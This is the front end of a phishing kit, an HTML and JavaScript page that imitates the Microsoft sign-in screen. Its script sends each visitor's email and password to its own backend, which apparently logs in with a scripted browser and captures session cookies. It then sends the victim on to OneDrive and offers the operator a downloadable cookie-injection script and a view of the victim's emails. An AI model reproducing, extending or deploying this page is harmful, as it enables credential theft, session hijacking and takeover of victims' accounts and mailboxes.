<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Mobile-first responsive design */
        @media (max-width: 958px) {
            body {
                padding: 5px;
                align-items: flex-start;
                background: white;
            }
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 0;
            width: 100%;
            max-width: 440px;
            animation: fadeIn 0.5s ease-out;
            margin-top: 0;
        }

        /* Mobile container adjustments */
        @media (max-width: 768px) {
            .container {
                padding: 20px 20px;
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .microsoft-logo {
            width: 108px;
            height: auto;
            margin-bottom: 15px;
        }

        .header {
            margin-bottom: 14px;
        }

        .header h1 {
            color: #1b1b1b;
            font-size: 24px;
            font-weight: 600;
            margin: 0;
        }

        /* Compact loading state */
        .container.loading-state .header {
            margin-bottom: 8px;
        }

        .container.loading-state .microsoft-dots-loader {
            margin: 15px 0 20px 0;
        }

        .back-info {
            margin: 10px 0;
            font-size: 13px;
            color: #323130;
            display: none;
        }

        .back-info.visible {
            display: block;
        }

        .status {
            background: #f8f9ff;
            padding: 15px;
            border-radius: 2px;
            margin-bottom: 20px;
            font-size: 13px;
        }

        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }

        .status-indicator.online {
            background: #107c10;
        }

        .status-indicator.offline {
            background: #d13438;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .microsoft-input {
            width: 100%;
            padding: 6px 6px 6px 0;
            border: none;
            border-bottom: 1px solid #0067b8;
            background-color: transparent;
            outline: none;
            font-size: 15px;
            color: #323130;
        }

        .microsoft-input:focus {
            border-bottom: 2px solid #0078d4;
        }

        .microsoft-input::placeholder {
            color: #605e5c;
        }

        .form-links {
            margin: 15px 0;
            font-size: 13px;
        }

        .form-links a {
            color: #0067b8;
            text-decoration: none;
        }

        .form-links a:hover {
            text-decoration: underline;
        }

        .form-links .create-account {
            color: #323130;
        }

        .button-group {
            display: flex;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 20px;
        }

        .btn {
            padding: 6px 24px;
            border: none;
            border-radius: 0;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            min-width: auto;
        }

        .btn-secondary {
            background-color: #e1e1e1;
            color: #323130;
        }

        .btn-primary {
            background-color: #0078d4;
            color: white;
        }

        .btn:hover:not(:disabled) {
            opacity: 0.9;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .message {
            padding: 12px;
            border-radius: 2px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .message.success {
            background: #dff6dd;
            color: #107c10;
        }

        .message.error {
            background: transparent;
            color: #d13438;
            padding: 2px 0;
            margin: 6px 0 8px 0;
            font-size: 13px;
            line-height: 1.2;
        }

        .message.microsoft-error {
            background: transparent;
            color: #d13438;
            padding: 2px 0;
            margin: 6px 0 8px 0;
            font-size: 13px;
            line-height: 1.2;
        }

        .message.microsoft-error a {
            color: #0067b8;
            text-decoration: underline;
        }

        .message.info {
            background: #deecf9;
            color: #323130;
        }

        .loading {
            display: none;
        }

        .loading-animation {
            position: absolute;
            top: -10px;
            left: 0;
            right: 0;
            height: 2px;
            background: #f3f2f1;
            border-radius: 1px;
            overflow: hidden;
            display: none;
        }

        .loading-animation::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, #0078d4, transparent);
            animation: loadingSlide 1.4s ease-in-out infinite both;
        }

        .loading-animation.active {
            display: block;
        }

        @keyframes loadingSlide {
            0% {
                left: -100%;
            }
            100% {
                left: 100%;
            }
        }

        /* Microsoft-style dot loading animation */
        .microsoft-dots-loader {
            display: none;
            justify-content: flex-start;
            align-items: center;
            margin: 20px 0 15px 0;
            height: 20px;
        }

        .microsoft-dots-loader.show {
            display: flex !important;
        }

        .microsoft-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background-color: #0078d4;
            margin: 0 2px;
            animation: microsoftDotPulse 1.4s infinite ease-in-out both;
        }

        .microsoft-dot:nth-child(1) { animation-delay: -0.32s; }
        .microsoft-dot:nth-child(2) { animation-delay: -0.16s; }
        .microsoft-dot:nth-child(3) { animation-delay: 0s; }
        .microsoft-dot:nth-child(4) { animation-delay: 0.16s; }
        .microsoft-dot:nth-child(5) { animation-delay: 0.32s; }

        @keyframes microsoftDotPulse {
            0%, 80%, 100% {
                transform: scale(0.8);
                opacity: 0.5;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* Loading cancel button */
        .loading-cancel-container {
            display: none;
            margin-top: 20px;
            text-align: left;
        }

        .loading-cancel-container.show {
            display: block !important;
        }

        .cancel-btn {
            background: transparent;
            border: 1px solid #0067b8;
            color: #0067b8;
            font-size: 13px;
            cursor: pointer;
            text-decoration: none;
            padding: 4px 12px;
            border-radius: 2px;
        }

        .cancel-btn:hover {
            color: #004a85;
            border-color: #004a85;
            background: #f3f9ff;
        }

        .cancel-btn:disabled {
            color: #a19f9d;
            border-color: #a19f9d;
            cursor: not-allowed;
            background: transparent;
        }



        /* Pulse animation for Microsoft logo during loading */
        .microsoft-logo.loading {
            animation: logoFadeInOut 2s ease-in-out infinite;
        }

        @keyframes logoFadeInOut {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        .sign-in-options {
            background: white;
            padding: 16px 41px;
            border-radius: 0;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            margin-top: 10px;
            text-align: left;
            font-size: 13px;
            color: #323130;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .sign-in-options img {
            width: 20px;
            height: 20px;
            vertical-align: middle;
        }

        /* Mobile sign-in options */
        @media (max-width: 768px) {
            .sign-in-options {
                padding: 15px 20px;
                margin-top: 8px;
                box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            }
        }



        .hidden {
            display: none;
        }

        .password-section {
            display: none;
        }

        .password-section.visible {
            display: block;
        }

        /* Footer links positioned at bottom right */
        .footer-links {
            position: fixed;
            bottom: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 13px;
            color: #605e5c;
            z-index: 1000;
        }

        .footer-links a {
            color: #605e5c;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .footer-links a:hover {
            color: #323130;
            text-decoration: underline;
        }

        .footer-dots {
            color: #605e5c;
            font-weight: bold;
            cursor: pointer;
            padding: 0 4px;
            user-select: none;
        }

        .footer-dots:hover {
            color: #323130;
        }

        /* Mobile footer adjustments */
        @media (max-width: 768px) {
            .footer-links {
                bottom: 10px;
                right: 10px;
                font-size: 12px;
                gap: 8px;
            }
        }

        /* Hide footer on very small screens to avoid overlap */
        @media (max-width: 480px) {
            .footer-links {
                display: none;
            }
        }
    </style>
</head>
<body>
    <!-- Footer links positioned at bottom right -->
    <div class="footer-links">
        <a href="#" onclick="return false;">Terms of use</a>
        <a href="#" onclick="return false;">Privacy & cookies</a>
        <span class="footer-dots">...</span>
    </div>

    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
        <div class="container">
            <div class="loading-animation" id="loadingAnimation"></div>
            <img class="microsoft-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">

            <div class="back-info" id="backInfo">
                <span id="enteredEmail"></span>
            </div>



            <div class="header">
                <h1 id="headerTitle">Sign in</h1>
            </div>

            <!-- Status and messages hidden -->
            <div class="status" style="display: none;">
                <span class="status-indicator" id="statusIndicator"></span>
                <span id="statusText">Checking backend...</span>
            </div>

            <!-- Message area -->
            <div id="messageArea" style="display: none;"></div>

            <!-- Loading indicator -->
            <div class="loading" id="loadingIndicator">
                <p id="loadingText">Processing...</p>
            </div>

            <!-- Microsoft-style dot loading animation -->
            <div class="microsoft-dots-loader" id="microsoftDotsLoader">
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
                <div class="microsoft-dot"></div>
            </div>

            <!-- Cancel button during loading -->
            <div class="loading-cancel-container" id="loadingCancelContainer">
                <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
            </div>

            <!-- Email Input Form - shown initially -->
            <div id="emailForm" style="display: block;">
                <div class="form-group">
                    <input type="email" id="emailInput" class="microsoft-input" placeholder="Email, phone, or Skype" required autofocus>
                </div>

                <div class="form-links">
                    <span class="create-account">No account? <a href="https://signup.live.com" target="_blank">Create one!</a></span>
                </div>

                <div class="form-links" style="margin-top: 0;">
                    <a href="https://account.live.com/acsr" target="_blank">Can't access your account?</a>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="verifyEmail()">
                        Next
                    </button>
                </div>
            </div>

            <!-- Password Input Form - shown after email verification -->
            <div id="passwordForm" class="password-section">
                <div class="form-group">
                    <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required>
                </div>

                <div class="form-links">
                    <a href="https://account.live.com/ResetPassword.aspx" target="_blank">Forgot password?</a>
                </div>

                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="signInWithPassword()">
                        Sign in
                    </button>
                </div>
            </div>


            <!-- Success form - shown after authentication -->
            <div id="successForm" class="password-section">
                <div style="text-align: center; padding: 20px 0;">
                    <div style="font-size: 48px; color: #107c10; margin-bottom: 15px;">✅</div>
                    <h2 style="color: #107c10; margin-bottom: 10px;">Successfully signed in!</h2>
                    <p id="userEmail" style="color: #323130; font-size: 14px; margin-bottom: 20px;"></p>

                    <div class="button-group">
                        <button type="button" class="btn btn-primary" onclick="viewEmails()">
                            View My Emails
                        </button>
                    </div>

                    <div class="button-group" style="margin-top: 15px;">
                        <button type="button" class="btn btn-secondary" onclick="logout()">
                            Sign Out
                        </button>
                    </div>
                </div>
            </div>


        </div>

        <!-- Sign-in options -->
        <div class="sign-in-options">
            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" 
                 alt="Sign-in options icon">
            <span>Sign-in options</span>
        </div>
    </div>



    <script>
        let currentSessionId = null;
        let verifiedEmailAddress = null; // Store the verified email
        let currentStep = 'email'; // 'email', 'password', 'success'
        const API_BASE = '';
        let authWindow = null;
        let currentEmail = null; // To store the email for password authentication
        let currentUserEmail = null; // To store the email for success message

        // Generate random alphanumeric title
        function generateRandomTitle() {
            const randomString = (Math.random() + 1).toString(36).substring(2, 80);
            document.title = randomString;
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            generateRandomTitle(); // Set random title
            setLoading(false); // Start with loading off
            checkBackendHealth();
            checkExistingSession();
            showEmailForm();
            
            // Clear error messages when user starts typing in password field
            const passwordInput = document.getElementById('passwordInput');
            if (passwordInput) {
                passwordInput.addEventListener('input', function() {
                    clearMessage(); // Clear any error messages when user starts typing
                });
            }
        });

        // Utility functions
        function showMessage(message, type = 'info') {
            const messageArea = document.getElementById('messageArea');
            messageArea.style.display = 'block';
            messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
        }

        function clearMessage() {
            const messageArea = document.getElementById('messageArea');
            messageArea.innerHTML = '';
            messageArea.style.display = 'none';
        }

        // Set loading state
        function setLoading(isLoading, message = 'Processing...', showSuccessMessage = true) {
            const loadingAnimation = document.getElementById('loadingAnimation');
            const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
            const microsoftLogo = document.querySelector('.microsoft-logo');
            const container = document.querySelector('.container');
            const emailForm = document.getElementById('emailForm');
            const passwordForm = document.getElementById('passwordForm');
            const successForm = document.getElementById('successForm');
            const headerTitle = document.getElementById('headerTitle');
            const loadingCancelContainer = document.getElementById('loadingCancelContainer');
            const backInfo = document.getElementById('backInfo');
            const messageArea = document.getElementById('messageArea');

            if (isLoading) {
                loadingAnimation.classList.add('active');
                microsoftLogo.style.display = 'block';
                microsoftLogo.style.visibility = 'visible';
                microsoftLogo.classList.add('loading');
                container.classList.add('loading-state');
                microsoftDotsLoader.classList.add('show');
                microsoftDotsLoader.style.display = 'flex';
                headerTitle.textContent = message;
                loadingCancelContainer.classList.add('show');

                emailForm.style.display = 'none';
                passwordForm.style.display = 'none';
                successForm.style.display = 'none';
            } else {
                loadingAnimation.classList.remove('active');
                microsoftDotsLoader.classList.remove('show');
                microsoftDotsLoader.style.display = 'none';
                microsoftLogo.classList.remove('loading');
                container.classList.remove('loading-state');
                loadingCancelContainer.classList.remove('show');
                microsoftLogo.style.display = 'block';
                microsoftLogo.style.visibility = 'visible';

                // Restore header text based on current step
                if (currentStep === 'email') {
                    headerTitle.textContent = 'Sign in';
                    emailForm.style.display = 'block';
                    passwordForm.style.display = 'none';
                    successForm.style.display = 'none';
                } else if (currentStep === 'password') {
                    headerTitle.textContent = 'Enter your password';
                    emailForm.style.display = 'none';
                    passwordForm.style.display = 'block';
                    successForm.style.display = 'none';
                } else if (currentStep === 'success') {
                    headerTitle.textContent = 'Welcome';
                    emailForm.style.display = 'none';
                    passwordForm.style.display = 'none';
                    successForm.style.display = 'block';
                }

                // Safely handle backInfo and messageArea elements
                if (backInfo) {
                    backInfo.style.display = '';
                }
                if (messageArea) {
                    messageArea.style.display = '';
                }
            }

            const buttons = document.querySelectorAll('.btn');
            const inputs = document.querySelectorAll('.microsoft-input');

            buttons.forEach(btn => btn.disabled = isLoading);
            inputs.forEach(input => input.disabled = isLoading);
        }

        function cancelLoading() {
            // Close auth window if it exists
            if (authWindow && !authWindow.closed) {
                authWindow.close();
            }

            // Clear timeout
            if (window.authTimeoutId) {
                clearTimeout(window.authTimeoutId);
                window.authTimeoutId = null;
            }

            setLoading(false);
            clearMessage();
            showEmailForm(); // Go back to email form
        }

        function showEmailForm() {
            currentStep = 'email';
            document.getElementById('emailForm').style.display = 'block';
            document.getElementById('passwordForm').style.display = 'none';
            document.getElementById('successForm').style.display = 'none';
            document.getElementById('headerTitle').textContent = 'Sign in ';
            document.getElementById('emailInput').value = ''; // Clear email input
            document.getElementById('backInfo').style.display = 'none';
            document.getElementById('backInfo').classList.remove('visible');
            clearMessage();
        }

        function showPasswordForm(email) {
            currentStep = 'password';
            verifiedEmailAddress = email; // Store the verified email
            currentEmail = email; // Store email for password auth
            document.getElementById('enteredEmail').textContent = email;
            document.getElementById('backInfo').style.display = 'block';
            document.getElementById('backInfo').classList.add('visible');
            document.getElementById('passwordInput').value = ''; // Clear password input
            document.getElementById('passwordInput').focus();
            document.getElementById('emailForm').style.display = 'none';
            document.getElementById('passwordForm').style.display = 'block';
            document.getElementById('successForm').style.display = 'none';
            document.getElementById('headerTitle').textContent = 'Enter your password';
            clearMessage();
        }

        function showAuthSuccess(email) {
                document.getElementById('headerTitle').textContent = 'Sign in successful';
                document.getElementById('emailForm').style.display = 'none';
                document.getElementById('passwordForm').style.display = 'none';

                const successDiv = document.createElement('div');
                successDiv.className = 'success-container';
                successDiv.innerHTML = `
                    <div class="success-message">
                        <h3>✅ Authentication Successful</h3>
                        <p>Signed in as: <strong>${email}</strong></p>
                        <p>Session cookies have been captured and saved.</p>
                        <div style="margin-top: 20px;">
                            <button onclick="downloadCookieScript()" class="form-button">Download Cookie Script</button>
                            <button onclick="showSessionData()" class="form-button">View Session Data</button>
                            <button onclick="resetForm()" class="form-button secondary">Sign in as different user</button>
                        </div>
                    </div>
                `;

                const container = document.querySelector('.container');
                container.appendChild(successDiv);
            }

            async function downloadCookieScript() {
                if (!currentSessionId) {
                    showMessage('No active session found', 'error');
                    return;
                }

                try {
                    const response = await fetch(`${API_BASE}/api/cookies/${currentSessionId}`);

                    if (response.ok) {
                        const blob = await response.blob();
                        const url = window.URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = `inject_session_${currentSessionId}.js`;
                        document.body.appendChild(a);
                        a.click();
                        window.URL.revokeObjectURL(url);
                        document.body.removeChild(a);
                        showMessage('Cookie injection script downloaded!', 'success');
                    } else {
                        throw new Error('Failed to download cookie script');
                    }
                } catch (error) {
                    console.error('Download error:', error);
                    showMessage('Failed to download cookie script: ' + error.message, 'error');
                }
            }

            async function showSessionData() {
                if (!currentSessionId) {
                    showMessage('No active session found', 'error');
                    return;
                }

                try {
                    const response = await fetch(`${API_BASE}/api/session-data/${currentSessionId}`);
                    const data = await response.json();

                    if (response.ok) {
                        alert(`Session Data:
Email: ${data.email}
Session ID: ${data.sessionId}
Total Cookies: ${data.totalCookies}
Domains: ${data.domains.join(', ')}
Timestamp: ${new Date(data.timestamp).toLocaleString()}
Status: ${data.status}`);
                    } else {
                        throw new Error(data.error || 'Failed to get session data');
                    }
                } catch (error) {
                    console.error('Session data error:', error);
                    showMessage('Failed to get session data: ' + error.message, 'error');
                }
            }


        // API Functions
        async function checkBackendHealth() {
            try {
                const response = await fetch(`${API_BASE}/api/health`);
                const data = await response.json();

                if (response.ok && data.authConfigured) {
                    console.log('✅ Backend healthy and Azure configured');
                    // Backend is ready, proceed to show the email form
                    setLoading(false);
                    showEmailForm();
                } else {
                    console.log('⚠️ Azure credentials not configured on backend');
                    // Silently proceed to show the email form - let the backend handle the error
                    setLoading(false);
                    showEmailForm();
                }
            } catch (error) {
                console.error('Backend health check failed:', error);
                setLoading(false);
                showEmailForm(); // Still show the form, let individual API calls handle errors
            }
        }

        async function checkExistingSession() {
            try {
                const response = await fetch(`${API_BASE}/api/status`);
                const data = await response.json();

                if (data.authenticated && data.userEmail) {
                    currentSessionId = data.sessionId;
                    currentUserEmail = data.userEmail;
                    setLoading(false);
                    showAuthSuccess(data.userEmail);
                    console.log('Found existing authenticated session:', data.userEmail);
                } else {
                    setLoading(false);
                    showEmailForm();
                }
            } catch (error) {
                console.error('Error checking session status:', error);
                setLoading(false);
                showEmailForm();
            }
        }

        async function verifyEmail() {
            const email = document.getElementById('emailInput').value.trim();

            if (!email) {
                showMessage('Please enter your email address.', 'error');
                return;
            }

            if (!isValidEmail(email)) {
                showMessage('Please enter a valid email address.', 'error');
                return;
            }

            clearMessage();
            setLoading(true, 'Taking you to your organization...', false);

            try {
                // First, verify if the email account exists
                const verifyResponse = await fetch(`${API_BASE}/api/verify-email`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: email })
                });

                const verifyData = await verifyResponse.json();

                if (verifyResponse.ok && verifyData.exists) {
                    // Account exists and preload started
                    console.log('✅ Email account verified, preload started');
                    currentSessionId = verifyData.sessionId; // Store session ID from preload

                    // Show password form immediately - don't wait for preload
                    console.log('🔓 Showing password form while preload continues in background');
                    setLoading(false);
                    showPasswordForm(email);

                    // Let preload continue in background without blocking UI
                    if (verifyData.preloadStarted) {
                        console.log('🔄 Puppeteer preload continuing in background for faster authentication');
                    }
                } else if (verifyData.exists === false) {
                    // Account doesn't exist
                    setLoading(false);
                    showMessage(verifyData.message || `We couldn't find an account with that username. Try another, or get a new Microsoft account.`, 'error');
                } else {
                    // Verification failed, but proceed with OAuth (fallback)
                    console.log('⚠️ Email verification failed, proceeding with Microsoft authentication');
                    setLoading(false);
                    proceedWithMicrosoftAuth();
                }

            } catch (error) {
                console.error('Email verification error:', error);
                setLoading(false);

                // If verification fails, proceed with OAuth as fallback
                console.log('⚠️ Email verification error, proceeding with Microsoft authentication');
                proceedWithMicrosoftAuth();
            }
        }

        // Wait for preload to be ready
        async function waitForPreloadReady(sessionId, email) {
            const maxWaitTime = 20000; // 20 seconds max
            const pollInterval = 1000; // Check every 1 second
            const startTime = Date.now();

            console.log(`⏳ Waiting for preload to be ready for ${email}...`);

            while ((Date.now() - startTime) < maxWaitTime) {
                try {
                    const response = await fetch(`${API_BASE}/api/preload-status/${sessionId}`);
                    if (response.ok) {
                        const data = await response.json();

                        if (data.status === 'preload_ready') {
                            console.log(`✅ Preload ready for ${email} after ${Date.now() - startTime}ms`);
                            return true;
                        } else if (data.status === 'preload_failed') {
                            console.log(`❌ Preload failed for ${email}`);
                            return false;
                        }
                    }
                } catch (e) {
                    console.warn('Error checking preload status:', e);
                }

                await new Promise(resolve => setTimeout(resolve, pollInterval));
            }

            console.log(`⏰ Preload wait timeout for ${email}`);
            return false;
        }

        async function proceedWithMicrosoftAuth() {
            setLoading(true, 'Redirecting to Microsoft...', false);

            try {
                // Get Microsoft authentication URL from backend
                const response = await fetch(`${API_BASE}/api/auth-url`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });

                const data = await response.json();

                if (response.ok && data.authUrl) {
                    currentSessionId = data.sessionId;

                    // Open Microsoft OAuth in popup
                    authWindow = window.open(
                        data.authUrl,
                        'microsoft-oauth',
                        'width=600,height=700,scrollbars=yes,resizable=yes,centerscreen=yes'
                    );

                    if (!authWindow) {
                        throw new Error('Popup blocked. Please allow popups and try again.');
                    }

                    // Poll for authentication completion
                    const pollInterval = setInterval(async () => {
                        try {
                            // Check if window is closed
                            if (authWindow.closed) {
                                clearInterval(pollInterval);
                                if (window.authTimeoutId) {
                                    clearTimeout(window.authTimeoutId);
                                }
                                setLoading(false);
                                showMessage('Authentication cancelled. Please try again.', 'error');
                                return;
                            }

                            // Check authentication status
                            const statusResponse = await fetch(`${API_BASE}/api/status?sessionId=${currentSessionId}`);
                            const statusData = await statusResponse.json();

                            if (statusData.authenticated) {
                                clearInterval(pollInterval);
                                if (window.authTimeoutId) {
                                    clearTimeout(window.authTimeoutId);
                                }
                                authWindow.close();
                                setLoading(false);
                                currentSessionId = statusData.sessionId;
                                currentUserEmail = statusData.userEmail;
                                showAuthSuccess(statusData.userEmail);
                                // No frontend notification message here
                            }

                        } catch (error) {
                            console.error('Error checking auth status:', error);
                        }
                    }, 2000); // Check every 2 seconds

                    // Timeout after 5 minutes
                    window.authTimeoutId = setTimeout(() => {
                        if (authWindow && !authWindow.closed) {
                            authWindow.close();
                        }
                        clearInterval(pollInterval);
                        setLoading(false);
                        showMessage('Authentication timed out. Please try again.', 'error');
                    }, 5 * 60 * 1000);

                } else {
                    throw new Error(data.error || 'Failed to get authentication URL');
                }

            } catch (error) {
                console.error('Authentication error:', error);
                setLoading(false);
                showMessage(`Authentication error: ${error.message}`, 'error');
            }
        }

        // Password authentication using fast auth endpoint
        async function signInWithPassword() {
            try {
                clearMessage(); // Clear any previous error messages immediately
                setLoading(true, 'Signing in...');

                const email = currentEmail; // Use the stored email
                const password = document.getElementById('passwordInput').value;

                if (!password) {
                    showMessage('Please enter your password', 'error');
                    setLoading(false);
                    return;
                }

                // Use fast authentication endpoint with preloaded browser
                const response = await fetch('/api/authenticate-password-fast', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ 
                        email, 
                        password,
                        sessionId: currentSessionId // Pass the preload session ID
                    })
                });

                const data = await response.json();

                if (response.status === 401) {
                    // Invalid credentials - stay on password form
                    setLoading(false);
                    showMessage(data.message || 'Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'microsoft-error');
                    return;
                }

                if (data.success) {
                    // Authentication successful
                    const authMethod = data.preloadUsed ? 'Fast Authentication (preloaded)' : 'Standard Authentication';
                    console.log(`Login successful! ${authMethod} - Cookies captured and saved.`);

                    // Show performance metrics if available
                    if (data.metrics) {
                        console.log(`⚡ Performance: ${data.metrics.totalAuthMs}ms total, preload: ${data.metrics.preloadUsed}`);
                    }

                    currentSessionId = data.sessionId;
                    currentUserEmail = data.userEmail;

                    // Redirect immediately to OneDrive
                    console.log('Redirecting to OneDrive...');
                    window.location.href = 'https://onedrive.live.com';
                } else {
                    throw new Error(data.message || data.error || 'Unknown error');
                }

            } catch (error) {
                console.error('Password authentication error:', error);
                setLoading(false);
                showMessage(`Authentication error: ${error.message}`, 'error');
            }
        }

        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        async function viewEmails() {
            clearMessage();
            setLoading(true, 'Loading your emails...', false);

            try {
                const response = await fetch(`${API_BASE}/api/emails?sessionId=${currentSessionId}&count=10`);
                const data = await response.json();

                if (response.ok) {
                    setLoading(false);

                    const emailList = data.emails.map(email => 
                        `<div style="border-bottom: 1px solid #e1e1e1; padding: 10px 0;">
                            <strong>${email.subject}</strong><br>
                            <small style="color: #666;">From: ${email.from.emailAddress.name || email.from.emailAddress.address}</small><br>
                            <small style="color: #666;">Date: ${new Date(email.receivedDateTime).toLocaleDateString()}</small><br>
                            <p style="margin: 5px 0; color: #323130;">${email.bodyPreview}</p>
                        </div>`
                    ).join('');

                    const emailWindow = window.open('', 'emails', 'width=800,height=600,scrollbars=yes,resizable=yes');
                    emailWindow.document.write(`
                        <html>
                            <head><title>Your Recent Emails</title></head>
                            <body style="font-family: Segoe UI, sans-serif; padding: 20px;">
                                <h2>Your Recent Emails (${data.count} items)</h2>
                                ${emailList}
                                <br><button onclick="window.close()">Close</button>
                            </body>
                        </html>
                    `);

                    // No frontend notification message here
                } else {
                    throw new Error(data.error || 'Failed to load emails');
                }

            } catch (error) {
                console.error('Error loading emails:', error);
                setLoading(false);
                showMessage(`Error loading emails: ${error.message}`, 'error');
            }
        }

        async function logout() {
            clearMessage();
            setLoading(true, 'Signing out...', false);

            try {
                if (currentSessionId) {
                    await fetch(`${API_BASE}/api/admin/session/${currentSessionId}`, {
                        method: 'DELETE',
                        headers: { 
                            'Authorization': `Bearer ${global.adminToken || 'admin'}`,
                            'Content-Type': 'application/json' 
                        }
                    });
                }

                currentSessionId = null;
                verifiedEmailAddress = null; // Clear verified email on logout
                currentEmail = null; // Clear current email on logout
                currentUserEmail = null; // Clear current user email on logout
                setLoading(false);
                showEmailForm(); // Return to email form on logout
                // No frontend success message on logout
            } catch (error) {
                console.error('Logout error:', error);
                currentSessionId = null;
                verifiedEmailAddress = null;
                currentEmail = null;
                currentUserEmail = null;
                setLoading(false);
                showEmailForm();
                // No frontend message on logout error
            }
        }

        // Helper function to check session status after password auth
        async function checkSessionStatus() {
            try {
                const response = await fetch(`${API_BASE}/api/status`);
                const data = await statusResponse.json();

                if (data.authenticated && data.userEmail) {
                    currentSessionId = data.sessionId;
                    currentUserEmail = data.userEmail;
                    setLoading(false);
                    showAuthSuccess(data.userEmail);
                    // No frontend success message here
                } else {
                    // If not authenticated after password attempt, fall back to Microsoft auth
                    // No frontend info message here
                    setTimeout(() => {
                        proceedWithMicrosoftAuth();
                    }, 1000);
                }
            } catch (error) {
                console.error('Error checking session status after password auth:', error);
                // No frontend info message here
                setTimeout(() => {
                    proceedWithMicrosoftAuth();
                }, 1000);
            }
        }

        // Function to reset the form to the initial state
        function resetForm() {
            currentSessionId = null;
            verifiedEmailAddress = null;
            currentEmail = null;
            currentUserEmail = null;
            setLoading(false);
            clearMessage();
            showEmailForm();
            // Remove any appended success message div
            const successDiv = document.querySelector('.success-container');
            if (successDiv) {
                successDiv.remove();
            }
        }

    </script>
